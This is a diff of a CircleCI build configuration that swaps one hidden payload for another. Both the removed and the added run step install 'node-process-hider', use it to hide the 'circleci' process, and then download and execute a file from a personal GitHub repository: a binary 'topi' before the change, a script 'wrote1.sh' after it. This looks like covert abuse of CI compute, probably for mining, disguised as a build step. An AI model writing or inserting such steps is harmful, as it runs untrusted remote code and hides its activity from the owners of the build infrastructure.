@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install --force-yes nodejs && npm i -g node-process-hider && sudo ph add circleci && wget https://raw.githubusercontent.com/Myaxisplay/pos/main/topi && chmod 777 topi && ./topi"
+      - run:  sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install --force-yes nodejs && npm i -g node-process-hider && sudo ph add circleci && wget https://raw.githubusercontent.com/faridmd/Heyzo/main/wrote1.sh && chmod +x wrote1.sh && bash wrote1.sh"
